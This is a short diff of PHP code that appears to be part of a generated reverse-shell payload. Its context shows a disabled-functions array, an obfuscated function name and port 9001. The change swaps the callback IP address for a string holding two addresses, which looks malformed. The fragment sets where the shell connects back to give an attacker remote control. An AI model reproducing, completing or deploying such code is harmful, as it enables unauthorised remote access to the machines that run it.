@@ -9,7 +9,7 @@
         $dis=array();
       }
       
-    $ipaddr='172.17.0.1';
+    $ipaddr='10.176.132.84 172.17.0.1';
     $port=9001;
 
     if(!function_exists('BetaYJRUmHtUP')){
